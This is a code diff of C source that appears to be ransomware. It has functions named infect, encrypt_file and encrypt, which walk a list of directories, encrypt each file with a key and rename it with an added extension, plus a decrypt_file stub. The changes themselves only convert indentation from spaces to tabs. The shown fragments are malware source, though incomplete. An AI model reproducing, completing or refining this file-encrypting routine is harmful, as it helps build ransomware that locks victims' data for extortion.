@@ -97,13 +97,13 @@ int infect(void) {
 int encrypt_file(const char* name, void *key) {
 	int helper_ret = 0;
 
-        size_t name_strlen = strlen(name);
-        size_t ext_strlen = strlen(EXTENSION);
+	size_t name_strlen = strlen(name);
+	size_t ext_strlen = strlen(EXTENSION);
 
-        if (name_strlen + ext_strlen >= PATH_MAX) {
-                printf_v("name would be longer than PATH_MAX");
-                return 1;
-        }
+	if (name_strlen + ext_strlen >= PATH_MAX) {
+		printf_v("name would be longer than PATH_MAX");
+		return 1;
+	}
 
 	if (name_strlen >= ext_strlen) {
 		size_t orig_len = name_strlen - ext_strlen;
@@ -114,7 +114,7 @@ int encrypt_file(const char* name, void *key) {
 		}
 	}
 
-        char name_new[PATH_MAX];
+	char name_new[PATH_MAX];
 	memcpy(name_new, name, name_strlen);
 	memcpy(name_new + name_strlen, EXTENSION, ext_strlen + 1);
 
@@ -159,12 +159,12 @@ int encrypt(const char *keyfile) {
 		return 1;
 	}
 
-        for (int i = 0 ; DIRECTORIES[i] != NULL ; i++) {
-                helper_ret = helper_list(DIRECTORIES[i], encrypt_file, key);
-                if (helper_ret != 0) { }
-        }
+	for (int i = 0 ; DIRECTORIES[i] != NULL ; i++) {
+		helper_ret = helper_list(DIRECTORIES[i], encrypt_file, key);
+		if (helper_ret != 0) { }
+	}
 
-        return ret;
+	return ret;
 }
 
 int decrypt_file(const char* name, void *key) {
